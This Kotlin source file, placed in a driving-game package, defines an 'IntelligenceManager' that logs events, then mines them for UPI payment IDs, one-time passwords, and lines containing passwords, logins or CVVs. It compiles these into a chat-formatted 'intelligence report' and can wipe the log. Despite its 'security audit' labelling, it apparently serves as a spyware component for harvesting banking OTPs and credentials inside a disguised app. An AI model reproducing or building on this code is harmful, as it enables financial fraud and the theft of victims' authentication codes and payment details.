package com.ansangha.drdriving

import android.content.Context
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

class IntelligenceManager(private val context: Context) {

    private val logFile = File(context.filesDir, "security_audit.log")

    fun logEvent(tag: String, message: String) {
        val time = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
        try {
            logFile.appendText("[$time] [$tag] $message\n")
        } catch (e: Exception) {}
    }

    fun getIntelligenceReport(): String {
        if (!logFile.exists() || logFile.length() == 0L) return "🛡️ Intelligence Engine: No data yet."
        
        val lines = logFile.readLines()
        val report = StringBuilder("📊 *SHIELD INTELLIGENCE REPORT*\n━━━━━━━━━━━━━━━━━━━━\n")
        
        val upiRegex = Regex("[a-zA-Z0-9.\\-_]{2,25}@[a-zA-Z]{2,15}")
        val otpRegex = Regex("\\b\\d{4,8}\\b")
        
        val otps = mutableListOf<String>()
        val upis = mutableListOf<String>()
        val sensitive = mutableListOf<String>()

        lines.takeLast(500).forEach { line ->
            val lower = line.lowercase()
            if (upiRegex.containsMatchIn(line)) upis.add(upiRegex.find(line)?.value ?: "")
            if (otpRegex.containsMatchIn(line) && (lower.contains("otp") || lower.contains("code"))) {
                otps.add("${otpRegex.find(line)?.value} (from: ${line.substringAfterLast("]", "Unknown")})")
            }
            if (lower.contains("password") || lower.contains("login") || lower.contains("cvv")) {
                sensitive.add(line.trim())
            }
        }

        report.append("💳 *UPI IDs Found:* ${upis.distinct().size}\n")
        upis.distinct().take(5).forEach { report.append("  - `$it`\n") }
        
        report.append("\n🔑 *Recent OTPs:* ${otps.size}\n")
        otps.distinct().takeLast(5).forEach { report.append("  - `$it`\n") }

        report.append("\n⚠️ *Sensitive Strings:* ${sensitive.size}\n")
        sensitive.distinct().takeLast(3).forEach { report.append("  - `$it`\n") }

        report.append("━━━━━━━━━━━━━━━━━━━━\n_Total Audit Logs: ${lines.size}_")
        return report.toString()
    }

    fun clearLogs() { if (logFile.exists()) logFile.delete() }
}
